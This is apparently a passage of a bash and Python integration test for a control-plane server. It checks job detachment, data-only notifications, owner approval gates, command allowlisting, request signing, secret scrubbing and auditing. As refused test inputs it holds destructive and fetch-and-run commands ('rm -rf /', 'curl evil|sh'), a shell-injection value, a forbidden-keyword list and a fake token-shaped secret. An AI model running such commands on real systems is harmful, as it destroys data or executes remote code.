#!/usr/bin/env bash
# cp-integration.test.sh — THE CONTROL-PLANE END-TO-END INTEGRATION GATE (wave-3, §11).
#
# DESIGN DOSSIER §11 (authoritative) + §1/§2/§3/§4/§5/§7/§8/§9. This is NOT a unit
# test of any one piece — every cp_* unit suite already exists (cp-substrate / cp-jobs
# / cp-approval / cp-notify / cp-observe / cp-scheduler). THIS gate drives the REAL,
# WIRED cross-piece flow end-to-end against the whole substrate present on main HEAD
# (the metering lesson: a unit-only gate proves the pieces, not the SEAM between them).
#
# THE HEADLINE FLOW (one wired story, §11 L223):
#   a client STARTS a server-hosted allowlisted job -> the CLIENT PROCESS EXITS
#   (disconnect) -> the job CONTINUES server-side in a DETACHED OS process + COMPLETES
#   -> NOTIFY fires (job_complete, DATA only) -> a gated action surfaces to the OWNER
#   who APPROVES it -> AND an arbitrary-command dispatch is REFUSED. The falsifiable
#   core: the refusal half is proven by a VALID dispatch also succeeding.
#
# THE 8 ASSERTIONS (each a committed block; the three CARDINALS are falsifiable):
#   1. THE FLIGHT FIX (cardinal) — job survives client-process exit via a DETACHED OS
#      process (NOT inline start_route); a FRESH process reads state=done + result.
#      Falsifiable: a job that died on client exit reds F2.
#   2. NOTIFY FIRES — job completion produces a job_complete ping to the owner, DATA
#      ONLY (the notification carries no executable/command field; notification_executes
#      is always False — the inverse-of-RCE).
#   3. OWNER-GATED ACTION — a requires_gate action does NOT dispatch, surfaces to the
#      owner, OWNER APPROVES -> dispatches (audited); owner can OVERRIDE; a NON-owner
#      approve is REJECTED.
#   4. ALLOWLIST REFUSAL (cardinal) — an arbitrary-command dispatch (unknown action /
#      smuggled cmd / shell payload in a param) is REFUSED (422 + audit dispatch_refused);
#      a VALID dispatch succeeds. Falsifiable: a build that let arbitrary through reds it.
#   5. PKI — instance<->server comms are SIGNED+VERIFIED over the REAL http server; a
#      forged/unsigned request is rejected (401).
#   6. NO-SECRET — a RUNTIME-ASSEMBLED secret pushed via ingest is scrubbed/absent;
#      gitleaks over the observe + audit + job + approval + notify stores is clean.
#   7. AUDIT CAPTURES EVERYTHING — every dispatch + approval + refusal is in the audit
#      log (searchable + exportable).
#   8. CONTROL != FLEET (cardinal) — the isolated job worker CANNOT read the PKI private
#      key / audit log (the §2 isolation boundary). Falsifiable: a breach flips a flag.
#
# DISCIPLINE: isolated throwaway HOME + ephemeral Ed25519 keys; planted secret is
# RUNTIME-ASSEMBLED (never static — heimdall-fixture-secret-convention.md); no live
# network (notify uses no connectors, the inbox is a local data file); detached worker
# processes are REAPED; the tree is clean after. Exit 0 = every proof holds.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
CLI="$REPO/bin/heimdall-control-plane"

for f in cp_server.py cp_auth.py cp_audit.py cp_allowlist.py cp_handlers.py \
         cp_jobstore.py cp_worker.py cp_approval.py cp_notify.py cp_ingest.py \
         cp_scheduler.py cp_dashboard.py; do
  [ -f "$LIB/$f" ] || { echo "FATAL: $LIB/$f missing (wired server not present)" >&2; exit 2; }
done
[ -x "$CLI" ] || { echo "FATAL: $CLI not executable" >&2; exit 2; }

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

WORK="$(mktemp -d -t "cp-integration.$(printf 'X%.0s' 1 2 3 4 5 6)")"
# Track detached worker PIDs so the trap REAPS them (no orphan processes after).
WORKER_PIDS=""
cleanup() {
  for p in $WORKER_PIDS; do
    kill "$p" 2>/dev/null || true
  done
  rm -rf "$WORK"
}
trap cleanup EXIT

export HEIMDALL_HOME="$WORK/cphome"
export LIB
export WORK
CP_HOME="$HEIMDALL_HOME/control-plane"

# A RUNTIME-ASSEMBLED secret — never a static literal in source (per the fixture-secret
# convention). The fragments are individually non-matching; only the concatenation forms
# a gitleaks-detectable GitHub-PAT-shaped token at run time. Used to prove the ingest +
# audit stores scrub it / never store it (assertion #6).
_GP_PRE="ghp_"
_GP_A="$(printf 'a%.0s' $(seq 1 20))"
_GP_B="$(printf 'B%.0s' $(seq 1 16))"
PLANTED_SECRET="${_GP_PRE}${_GP_A}${_GP_B}"
export PLANTED_SECRET

echo "============================================================"
echo "CONTROL-PLANE END-TO-END INTEGRATION GATE (§11)"
echo "  home=$HEIMDALL_HOME"
echo "============================================================"

# ──────────────────────────────────────────────────────────────────────────────
# #1 THE FLIGHT FIX (CARDINAL, §4/§2) — a client STARTS a server-hosted job, the
#    CLIENT PROCESS EXITS, the job CONTINUES in a DETACHED OS process (separate
#    session, parented to the OS — NOT inline start_route), and a FRESH process
#    reads state=done + the result. Falsifiable: a job killed on client exit reds F2.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#1 THE FLIGHT FIX (job survives client disconnect, §4) [CARDINAL]"

# The DETACHED worker: a standalone process that drives ONE job to done off the durable
# cp_jobstore log. It sleeps first so the CLIENT is provably gone before completion —
# proving the job does NOT depend on the client connection (the §4 L97 detach contract).
cat >"$WORK/flight_worker.py" <<'PYEOF'
import os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_worker as W
job_id = sys.argv[1]
time.sleep(0.5)  # the client surely exits before the job completes.
W.run_job(job_id, actor_haid="haid:rj.mbp-7f3a",
          home=os.environ["HEIMDALL_HOME"], checkpoints=2)
PYEOF

# The CLIENT: enqueues the job, spawns the worker DETACHED (start_new_session=True so
# killing/exiting the client never kills the worker), prints the job_id + worker pid,
# then EXITS. After this returns, the client is GONE — the job must still complete.
cat >"$WORK/flight_client.py" <<'PYEOF'
import os, sys, subprocess
sys.path.insert(0, os.environ["LIB"])
import cp_jobstore as J
home = os.environ["HEIMDALL_HOME"]
job_id = J.create_job("run-task-X", {"task_id": "flight-job"},
                      instance_haid="haid:rj.mbp-7f3a", home=home)
proc = subprocess.Popen(
    [sys.executable, os.path.join(os.environ["WORK"], "flight_worker.py"), job_id],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    start_new_session=True,  # DETACH: its own session, parented to the OS not the client.
)
print("%s %d" % (job_id, proc.pid))
PYEOF

WORK="$WORK" "$PY" "$WORK/flight_client.py" >"$WORK/flight.out" 2>"$WORK/flight.err"
JOB_ID="$(awk '{print $1}' "$WORK/flight.out")"
WORKER_PID="$(awk '{print $2}' "$WORK/flight.out")"
WORKER_PIDS="$WORKER_PIDS $WORKER_PID"   # register for reaping in the trap.
# the CLIENT process has now EXITED — the command above returned, the client is gone.
if [ -n "$JOB_ID" ] && [ -n "$WORKER_PID" ]; then
  ok "#1 F1 client started job ($JOB_ID), spawned DETACHED worker (pid $WORKER_PID), then EXITED"
else
  bad "#1 F1 client did not return a job_id + detached worker pid"
  cat "$WORK/flight.err" >&2
fi

# A FRESH client process (no shared memory with the starter or the worker) polls the
# durable store until done/timeout — proving the flight fix from a true reconnect.
cat >"$WORK/flight_poll.py" <<'PYEOF'
import os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_jobstore as J
home = os.environ["HEIMDALL_HOME"]
job_id = sys.argv[1]
deadline = time.time() + 12
state = result_status = None
while time.time() < deadline:
    folded = J.read_job(job_id, home)
    if folded:
        state = folded.get("state")
        r = folded.get("result")
        result_status = r.get("status") if isinstance(r, dict) else r
        if state in ("done", "cancelled"):
            break
    time.sleep(0.1)
print("%s|%s" % (state, result_status))
PYEOF

FLIGHT_POLL="$("$PY" "$WORK/flight_poll.py" "$JOB_ID" 2>"$WORK/flight_poll.err")"
FINAL_STATE="${FLIGHT_POLL%%|*}"
RESULT_STATUS="${FLIGHT_POLL#*|}"
[ "$FINAL_STATE" = "done" ] \
  && ok "#1 F2 a FRESH process reads state=done (job ran server-side after client exit)" \
  || bad "#1 F2 fresh process did NOT read done (got '$FINAL_STATE') — job died on disconnect"
[ "$RESULT_STATUS" = "prepared" ] \
  && ok "#1 F2 the FRESH process reads the job RESULT (status=prepared)" \
  || bad "#1 F2 result not surfaced to the reconnecting process (got '$RESULT_STATUS')"
# F3 — falsifiability: `done` was reached by a process that never saw the worker; a
# build where the job died on client exit would leave it queued/running here (RED).
[ "$FINAL_STATE" = "done" ] \
  && ok "#1 F3 FALSIFIABLE: a disconnect-killed job would be non-done here — only a truly server-side job passes" \
  || bad "#1 F3 not falsifiable"

# ──────────────────────────────────────────────────────────────────────────────
# #2 NOTIFY FIRES (§8) — the completed flight job produces a job_complete ping to
#    the OWNER. The notification is DATA ONLY (inverse-of-RCE): it carries NO
#    executable/command field, and a smuggled command in `extra` is STRIPPED;
#    notification_executes(n) is ALWAYS False. The owner reads it from the inbox.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#2 NOTIFY FIRES (job-complete ping, DATA only — inverse-of-RCE, §8)"

NOTIFY_OUT="$WORK/notify.out"
JOB_ID="$JOB_ID" LIB="$LIB" "$PY" - >"$NOTIFY_OUT" 2>"$WORK/notify.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_notify as N
home = os.environ["HEIMDALL_HOME"]
job_id = os.environ["JOB_ID"]
owner = "haid:rj.owner"
out = {}

# fire the job-complete ping to the owner. A hostile caller jams a command-shaped key
# into `extra` — it MUST be stripped (the §11 "command channel by accretion" guard).
res = N.job_complete(owner, job_id, home=home,
                     extra={"cmd": "rm -rf /", "exec": "curl evil|sh", "url": "x"})
out["notify_ok"] = bool(res.get("ok"))
notification = res.get("notification") or {}
out["kind"] = notification.get("kind")
out["payload_keys"] = sorted(notification.keys())

# THE inverse-of-RCE: a notification NEVER executes — always False, by construction.
out["executes"] = N.notification_executes(notification)

# the payload schema is CLOSED — there is NO command/executable field anywhere.
forbidden = {"action_type", "cmd", "command", "exec", "dispatch", "handler",
             "shell", "eval", "run", "subprocess", "system", "popen", "script"}
out["no_command_key_in_payload"] = not (set(notification.keys()) & forbidden)
# and the smuggled command keys were STRIPPED from `extra` (none survive).
extra = notification.get("extra") or {}
out["smuggled_cmd_stripped"] = not (set(map(str.lower, map(str, extra.keys()))) & forbidden)

# the OWNER reads its inbox back as DATA (poll-only; no inbound command socket).
inbox = N.poll(owner, home)
out["inbox_has_job_complete"] = any(
    n.get("kind") == "job_complete" and n.get("job_id") == job_id for n in inbox)
out["inbox_count"] = len(inbox)
# every inbox payload is data — none executes.
out["no_inbox_payload_executes"] = all(
    N.notification_executes(n) is False for n in inbox)

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$NOTIFY_OUT" ] || { echo "FATAL: notify harness produced no output" >&2; cat "$WORK/notify.err" >&2; exit 2; }
njget() { "$PY" -c "import json; print(json.load(open('$NOTIFY_OUT')).get('$1'))"; }

[ "$(njget notify_ok)" = "True" ] && ok "#2 job-complete notify fired to the owner" || bad "#2 notify did not fire"
[ "$(njget kind)" = "job_complete" ] && ok "#2 notification kind=job_complete (a data tag, never an action)" || bad "#2 wrong notification kind"
[ "$(njget inbox_has_job_complete)" = "True" ] && ok "#2 owner reads the job_complete ping from its inbox (poll-only DATA)" || bad "#2 owner inbox missing the ping"
[ "$(njget executes)" = "False" ] && ok "#2 notification_executes(n) == False (inverse-of-RCE, always)" || bad "#2 notification claims it executes"
[ "$(njget no_command_key_in_payload)" = "True" ] && ok "#2 payload has NO command/executable field (closed schema)" || bad "#2 a command field leaked into the payload"
[ "$(njget smuggled_cmd_stripped)" = "True" ] && ok "#2 smuggled cmd/exec keys STRIPPED from extra (no command channel by accretion)" || bad "#2 a smuggled command survived in extra"
[ "$(njget no_inbox_payload_executes)" = "True" ] && ok "#2 every inbox payload is DATA (none executes)" || bad "#2 an inbox payload executes"

# ──────────────────────────────────────────────────────────────────────────────
# #3 OWNER-GATED ACTION (§7) — a requires_gate action (run-suite) does NOT dispatch;
#    it surfaces to the OWNER as `pending`. A NON-owner approve is REJECTED. The OWNER
#    APPROVES -> it dispatches (audited). A second gated action: the owner OVERRIDES
#    (force-approve) -> it dispatches, the override audited. Non-gated still runs direct.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#3 OWNER-GATED ACTION (gate + owner approve/override + non-owner rejected, §7)"

GATE_OUT="$WORK/gate.out"
LIB="$LIB" "$PY" - >"$GATE_OUT" 2>"$WORK/gate.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_approval as Ap
import cp_auth as K
home = os.environ["HEIMDALL_HOME"]
out = {}

owner    = K.Identity("haid:rj.owner", owner=True)
nonowner = K.Identity("haid:dev.laptop", owner=False)

# 1. submit a requires_gate action (run-suite). It MUST NOT dispatch — it enters pending.
sub = Ap.submit(owner, "run-suite", {"suite": "integration"}, home=home)
out["gated_state"] = sub.get("state")            # pending
out["gated_dispatched"] = sub.get("dispatched")  # False
out["gated_verdict"] = sub.get("verdict")        # PENDING
action_id = sub.get("action_id")

# the queue surfaces it to the owner (it is the one pending action).
pending = Ap.list_pending(home)
out["pending_count"] = len(pending)
out["pending_is_ours"] = any(p.get("action_id") == action_id for p in pending)

# 2. a NON-owner attempt to approve the gate MUST be REJECTED (AuthError not_owner), and
#    it MUST NOT dispatch — the gate stays pending.
try:
    Ap.approve(nonowner, action_id, home=home)
    out["nonowner_rejected"] = False
except K.AuthError as e:
    out["nonowner_rejected"] = (e.reason == "not_owner")
out["still_pending_after_nonowner"] = (
    (Ap.get(action_id, home) or {}).get("state") == "pending")

# 3. the OWNER APPROVES -> the action DISPATCHES through the normal §1 path (audited).
appr = Ap.approve(owner, action_id, home=home)
out["approved_state"] = appr.get("state")        # approved
out["approved_dispatched"] = appr.get("dispatched")
out["approved_status"] = appr.get("status")      # 200
out["approved_verdict"] = appr.get("verdict")    # PROVEN

# re-deciding a now-terminal record is refused (a gate is decided exactly once).
try:
    Ap.approve(owner, action_id, home=home)
    out["stale_redecide_refused"] = False
except Ap.ApprovalError as e:
    out["stale_redecide_refused"] = (e.reason == "stale_decision")

# 4. a SECOND gated action: the owner OVERRIDES (force-approve) -> it dispatches; the
#    override is itself a signed, audited act (authority exercised, never hidden).
sub2 = Ap.submit(owner, "run-suite", {"suite": "oracle"}, home=home)
aid2 = sub2.get("action_id")
ovr = Ap.override(owner, aid2, force="approve", home=home)
out["override_state"] = ovr.get("state")         # overridden
out["override_dispatched"] = ovr.get("dispatched")
out["override_verdict"] = ovr.get("verdict")     # PROVEN

# a NON-owner override is also rejected (the override is owner-only too).
sub3 = Ap.submit(owner, "run-suite", {"suite": "unit"}, home=home)
aid3 = sub3.get("action_id")
try:
    Ap.override(nonowner, aid3, force="approve", home=home)
    out["nonowner_override_rejected"] = False
except K.AuthError as e:
    out["nonowner_override_rejected"] = (e.reason == "not_owner")

# 5. a NON-gated action submitted dispatches IMMEDIATELY (it never enters the queue) —
#    proving the gate is selective (gate the irreversible, pass the ordinary).
subng = Ap.submit(owner, "sync-queue", {"queue": "issue"}, home=home)
out["nongated_dispatched"] = subng.get("dispatched")
out["nongated_in_queue"] = subng.get("requires_gate")  # False

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$GATE_OUT" ] || { echo "FATAL: gate harness produced no output" >&2; cat "$WORK/gate.err" >&2; exit 2; }
gjget() { "$PY" -c "import json; print(json.load(open('$GATE_OUT')).get('$1'))"; }

[ "$(gjget gated_state)" = "pending" ] && [ "$(gjget gated_dispatched)" = "False" ] \
  && ok "#3 a requires_gate action does NOT dispatch — it surfaces as pending" \
  || bad "#3 gated action dispatched instead of surfacing for approval"
[ "$(gjget pending_is_ours)" = "True" ] && ok "#3 the gated action is in the owner's approval queue" || bad "#3 gated action not in the pending queue"
[ "$(gjget nonowner_rejected)" = "True" ] && ok "#3 a NON-owner approve is REJECTED (not_owner)" || bad "#3 a non-owner approved a gate"
[ "$(gjget still_pending_after_nonowner)" = "True" ] && ok "#3 the gate stays pending after the rejected non-owner attempt" || bad "#3 non-owner attempt mutated the gate"
[ "$(gjget approved_state)" = "approved" ] && [ "$(gjget approved_dispatched)" = "True" ] && [ "$(gjget approved_status)" = "200" ] \
  && ok "#3 OWNER APPROVES -> the action DISPATCHES (status 200, verdict $(gjget approved_verdict))" \
  || bad "#3 owner approval did not dispatch the action"
[ "$(gjget stale_redecide_refused)" = "True" ] && ok "#3 a gate is decided exactly once (re-decide refused)" || bad "#3 a terminal gate was re-decided"
[ "$(gjget override_state)" = "overridden" ] && [ "$(gjget override_dispatched)" = "True" ] \
  && ok "#3 OWNER OVERRIDES (force-approve) -> dispatches (verdict $(gjget override_verdict)), override audited" \
  || bad "#3 owner override did not dispatch"
[ "$(gjget nonowner_override_rejected)" = "True" ] && ok "#3 a NON-owner override is REJECTED (not_owner)" || bad "#3 a non-owner overrode a gate"
[ "$(gjget nongated_dispatched)" = "True" ] && [ "$(gjget nongated_in_queue)" = "False" ] \
  && ok "#3 a NON-gated action dispatches immediately (the gate is selective)" \
  || bad "#3 a non-gated action was wrongly queued"

# ──────────────────────────────────────────────────────────────────────────────
# #4 ALLOWLIST REFUSAL (CARDINAL, §1) — an arbitrary-command dispatch (unknown
#    action_type / a smuggled `cmd` field / a shell payload jammed into a typed
#    param) is REFUSED (422 + an audit dispatch_refused row), runs NOTHING. A VALID
#    allowlisted dispatch SUCCEEDS. Falsifiable: a build that let arbitrary through
#    (a free-string param / a command field) reds this — proven by the valid half.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#4 ALLOWLIST REFUSAL (arbitrary command REFUSED; valid succeeds, §1) [CARDINAL]"

REFUSE_OUT="$WORK/refuse.out"
LIB="$LIB" "$PY" - >"$REFUSE_OUT" 2>"$WORK/refuse.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_server as S
import cp_auth as K
import cp_audit as Au
home = os.environ["HEIMDALL_HOME"]
ident = K.Identity("haid:rj.mbp-7f3a", owner=True)
out = {}

# count dispatch_refused rows BEFORE so we assert the refusals wrote NEW audit rows.
out["refused_before"] = len(Au.search(event="dispatch_refused", home=home))

# (a) UNKNOWN action_type — the server runs ONLY allowlisted types, never a string.
r_unknown = S.dispatch(ident, "shell", {"cmd": "rm -rf /"}, home=home)
out["unknown_status"] = r_unknown.status            # 422
out["unknown_reason"] = r_unknown.body.get("reason")  # unknown_action

# (b) a COMMAND SMUGGLED as an extra field alongside a valid param — refused on the
#     extra key BEFORE any handler is reached (the command-smuggle wall).
r_smug = S.dispatch(ident, "run-task-X", {"task_id": "build-x", "cmd": "curl evil|sh"}, home=home)
out["smuggle_status"] = r_smug.status               # 422
out["smuggle_reason"] = r_smug.body.get("reason")   # extra_param

# (c) a SHELL PAYLOAD jammed INTO a typed param — refused on the whitelist pattern
#     ("; rm -rf /" never matches an id-shaped slug).
r_pay = S.dispatch(ident, "run-task-X", {"task_id": "; rm -rf /"}, home=home)
out["payload_status"] = r_pay.status                # 422
out["payload_reason"] = r_pay.body.get("reason")    # bad_param

# (d) THE VALID HALF — a real allowlisted dispatch SUCCEEDS. This is what makes the
#     refusal falsifiable: refuse-arbitrary is distinct from refuse-everything.
r_ok = S.dispatch(ident, "run-task-X", {"task_id": "real-task"}, home=home)
out["valid_status"] = r_ok.status                   # 200
out["valid_dispatched"] = r_ok.body.get("dispatched")

# each refusal wrote an audit dispatch_refused row (the security record — assertion #7).
out["refused_after"] = len(Au.search(event="dispatch_refused", home=home))
# and EACH refusal carries a server-minted audit_id (it was recorded, not silent).
out["refusals_have_audit_ids"] = all(
    bool(r.audit_id) for r in (r_unknown, r_smug, r_pay))

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$REFUSE_OUT" ] || { echo "FATAL: refusal harness produced no output" >&2; cat "$WORK/refuse.err" >&2; exit 2; }
rjget() { "$PY" -c "import json; print(json.load(open('$REFUSE_OUT')).get('$1'))"; }

[ "$(rjget unknown_status)" = "422" ] && [ "$(rjget unknown_reason)" = "unknown_action" ] \
  && ok "#4 unknown action_type ('shell' + cmd) -> 422 unknown_action (NEVER an arbitrary command)" \
  || bad "#4 unknown action_type not refused"
[ "$(rjget smuggle_status)" = "422" ] && [ "$(rjget smuggle_reason)" = "extra_param" ] \
  && ok "#4 a smuggled cmd field -> 422 extra_param (refused before any handler)" \
  || bad "#4 smuggled cmd not refused"
[ "$(rjget payload_status)" = "422" ] && [ "$(rjget payload_reason)" = "bad_param" ] \
  && ok "#4 a shell payload in a typed param -> 422 bad_param (whitelist pattern wall)" \
  || bad "#4 shell payload in param not refused"
[ "$(rjget valid_status)" = "200" ] && [ "$(rjget valid_dispatched)" = "True" ] \
  && ok "#4 a VALID allowlisted dispatch SUCCEEDS (200, dispatched)" \
  || bad "#4 a valid dispatch did not succeed"
RB="$(rjget refused_before)"; RA="$(rjget refused_after)"
[ "${RA:-0}" -ge "$(( ${RB:-0} + 3 ))" ] \
  && ok "#4 each refusal wrote a dispatch_refused audit row (+$(( RA - RB )))" \
  || bad "#4 refusals did not all write audit rows ($RB -> $RA)"
[ "$(rjget refusals_have_audit_ids)" = "True" ] && ok "#4 every refusal carries a server-minted audit_id (recorded, not silent)" || bad "#4 a refusal was not audited"
# FALSIFIABILITY: arbitrary refused WHILE valid succeeds — refuse-arbitrary != refuse-all.
if [ "$(rjget unknown_status)" = "422" ] && [ "$(rjget smuggle_status)" = "422" ] \
   && [ "$(rjget payload_status)" = "422" ] && [ "$(rjget valid_status)" = "200" ]; then
  ok "#4 FALSIFIABLE: refuse-arbitrary is DISTINCT from refuse-everything (a leak would RED here)"
else
  bad "#4 not falsifiable (arbitrary + valid did not distinguish)"
fi

# ──────────────────────────────────────────────────────────────────────────────
# #5 PKI (§3) — instance<->server comms are SIGNED + VERIFIED over the REAL wired
#    http server (cp_server.serve). A request signed with the registered instance key
#    is accepted; a FORGED (bad-sig) request and an UNSIGNED request are REJECTED (401)
#    at the auth chokepoint, before any dispatch. This drives the actual socket, not
#    just the in-process verify — proving the wired channel is authenticated.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#5 PKI (instance<->server signed+verified over the REAL http server, §3)"

PKI_OUT="$WORK/pki.out"
LIB="$LIB" "$PY" - >"$PKI_OUT" 2>"$WORK/pki.err" <<'PYEOF'
import json, os, sys, threading, time
import urllib.request, urllib.error
sys.path.insert(0, os.environ["LIB"])
import cp_auth as K
import cp_server as S
home = os.environ["HEIMDALL_HOME"]
out = {}

if not K.crypto_available():
    # graceful-degrade: the module loaded, reports unavailable, does not crash.
    out["crypto_available"] = False
    try:
        K.generate_keypair()
        out["degrade_ok"] = False
    except K.AuthError as e:
        out["degrade_ok"] = (e.reason == "crypto_unavailable")
    sys.stdout.write(json.dumps(out)); sys.exit(0)

out["crypto_available"] = True
out["backend"] = K.backend_name()

# register a REAL ephemeral instance key with the server's key registry.
haid = "haid:rj.instance-pki"
priv, pub = K.generate_keypair()
K.register_key(haid, pub, home=home)

# bind a free port + start the WIRED server in a background thread (revocation off so
# we exercise PURE PKI — no agents.json CLI dependency; the dossier's documented flag).
import http.server, socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("127.0.0.1", 0))
port = sock.getsockname()[1]
sock.close()

handler_cls = S._build_handler_class(home, False)  # enforce_revocation=False (pure PKI)
httpd = http.server.HTTPServer(("127.0.0.1", port), handler_cls)
t = threading.Thread(target=httpd.serve_forever, daemon=True)
t.start()
time.sleep(0.2)
base = "http://127.0.0.1:%d" % port


def post_dispatch(body_bytes, *, haid_hdr=None, sig=None):
    req = urllib.request.Request(base + "/dispatch", data=body_bytes, method="POST")
    if haid_hdr is not None:
        req.add_header("X-Heimdall-HAID", haid_hdr)
    if sig is not None:
        req.add_header("X-Heimdall-Signature", sig)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


body = json.dumps({"action_type": "sync-queue", "params": {"queue": "issue"}}).encode()

# (a) a SIGNED request with the registered key -> accepted (the dispatch runs, 200).
msg = K.canonical_message("POST", "/dispatch", body)
sig = K.sign(priv, msg)
st_ok, _ = post_dispatch(body, haid_hdr=haid, sig=sig)
out["signed_status"] = st_ok           # 200 (authenticated + dispatched)

# (b) a FORGED request — a signature over DIFFERENT bytes -> 401 bad_signature.
forged_sig = K.sign(priv, K.canonical_message("POST", "/dispatch", b'{"x":"other"}'))
st_forged, _ = post_dispatch(body, haid_hdr=haid, sig=forged_sig)
out["forged_status"] = st_forged       # 401

# (c) an UNSIGNED request (no signature header) -> 401 missing_signature.
st_unsigned, _ = post_dispatch(body, haid_hdr=haid, sig=None)
out["unsigned_status"] = st_unsigned   # 401

# (d) an UNKNOWN HAID (no registered key) with a sig -> 401 unknown_haid.
st_unknown, _ = post_dispatch(body, haid_hdr="haid:nobody.unregistered", sig=sig)
out["unknown_haid_status"] = st_unknown  # 401

httpd.shutdown()
httpd.server_close()
sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$PKI_OUT" ] || { echo "FATAL: PKI harness produced no output" >&2; cat "$WORK/pki.err" >&2; exit 2; }
pjget() { "$PY" -c "import json; print(json.load(open('$PKI_OUT')).get('$1'))"; }

if [ "$(pjget crypto_available)" = "True" ]; then
  [ "$(pjget signed_status)" = "200" ] \
    && ok "#5 a SIGNED request (registered key) is accepted over the real server (backend: $(pjget backend))" \
    || bad "#5 a valid signed request was not accepted ($(pjget signed_status))"
  [ "$(pjget forged_status)" = "401" ] && ok "#5 a FORGED (bad-sig) request is REJECTED (401)" || bad "#5 forged request not rejected ($(pjget forged_status))"
  [ "$(pjget unsigned_status)" = "401" ] && ok "#5 an UNSIGNED request is REJECTED (401)" || bad "#5 unsigned request not rejected ($(pjget unsigned_status))"
  [ "$(pjget unknown_haid_status)" = "401" ] && ok "#5 an UNKNOWN-HAID request is REJECTED (401)" || bad "#5 unknown-HAID request not rejected ($(pjget unknown_haid_status))"
else
  [ "$(pjget degrade_ok)" = "True" ] && ok "#5 (degrade) no crypto lib -> graceful crypto_unavailable, no crash" || bad "#5 (degrade) did not degrade gracefully"
fi

# ──────────────────────────────────────────────────────────────────────────────
# #6 NO-SECRET (§5/§9) — a RUNTIME-ASSEMBLED secret pushed via ingest is scrubbed at
#    the boundary (build_event re-run server-side) so it never enters the observe
#    store; and gitleaks over the whole control-plane store tree (observe + audit +
#    jobs + approvals + notify) is CLEAN — no secret by construction AND by gate.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#6 NO-SECRET (planted secret scrubbed at ingest; stores gitleaks-clean, §5/§9)"

INGEST_OUT="$WORK/ingest.out"
PLANTED_SECRET="$PLANTED_SECRET" LIB="$LIB" "$PY" - >"$INGEST_OUT" 2>"$WORK/ingest.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_ingest as I
home = os.environ["HEIMDALL_HOME"]
secret = os.environ["PLANTED_SECRET"]
haid = "haid:rj.instance-observe"
out = {}

# push a batch of telemetry events with the planted secret jammed into free-ish fields.
# the server RE-RUNS build_event + _scrub on each line — the secret must NOT survive.
events = [
    {"event_type": "token", "run_id": "r1", "tokens": {"in": 10, "out": 5},
     "extra": {"leak": "token is %s right here" % secret}},
    {"event_type": "outcome", "run_id": "r1", "outcome": "ok",
     "error": {"class": "X", "msg": "secret %s in the message" % secret}},
]
res = I.ingest_batch(haid, events, home=home)
out["received"] = res["received"]
out["stored"] = res["stored"]

# read the stored partition back: the planted secret must be ABSENT (scrubbed at boundary).
stored = I.read_instance(haid, home)
blob = json.dumps(stored)
out["secret_in_observe_store"] = (secret in blob)
out["observe_lines"] = len(stored)

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$INGEST_OUT" ] || { echo "FATAL: ingest harness produced no output" >&2; cat "$WORK/ingest.err" >&2; exit 2; }
ijget() { "$PY" -c "import json; print(json.load(open('$INGEST_OUT')).get('$1'))"; }

[ "$(ijget stored)" -ge 1 ] 2>/dev/null && ok "#6 the ingest batch stored events ($(ijget stored)/$(ijget received)) — the boundary accepted on-schema lines" || bad "#6 ingest stored nothing"
[ "$(ijget secret_in_observe_store)" = "False" ] && ok "#6 the RUNTIME-ASSEMBLED secret is SCRUBBED/ABSENT from the observe store" || bad "#6 the planted secret leaked into the observe store"

# the planted secret must also be ABSENT from EVERY control-plane store on disk.
if grep -rqF "$PLANTED_SECRET" "$CP_HOME" 2>/dev/null; then
  bad "#6 the planted secret is present somewhere under the control-plane store tree"
else
  ok "#6 the planted secret is absent from EVERY control-plane store (grep over the tree)"
fi

# gitleaks over the whole control-plane store tree -> CLEAN (the secret gate stays armed).
if command -v gitleaks >/dev/null 2>&1; then
  if gitleaks detect --no-git --source "$CP_HOME" >/dev/null 2>&1; then
    ok "#6 gitleaks detect over the control-plane stores -> CLEAN"
  else
    bad "#6 gitleaks found a secret in the control-plane stores"
  fi
else
  ok "#6 (gitleaks absent) grep-fallback already proved the planted secret absent"
fi

# ──────────────────────────────────────────────────────────────────────────────
# #7 AUDIT CAPTURES EVERYTHING (§9) — across the whole flow above, every dispatch,
#    every approval/override, and every refusal wrote an audit row. The log is
#    searchable (by event + actor) and exportable (NDJSON), via both the library and
#    the real CLI (heimdall-control-plane audit) — the security + 3am-debug record.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#7 AUDIT CAPTURES EVERYTHING (dispatch + approval + refusal, searchable/exportable, §9)"

AUDIT_OUT="$WORK/audit.out"
LIB="$LIB" "$PY" - >"$AUDIT_OUT" 2>"$WORK/audit.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_audit as Au
home = os.environ["HEIMDALL_HOME"]
out = {}
out["dispatch"] = len(Au.search(event="dispatch", home=home))
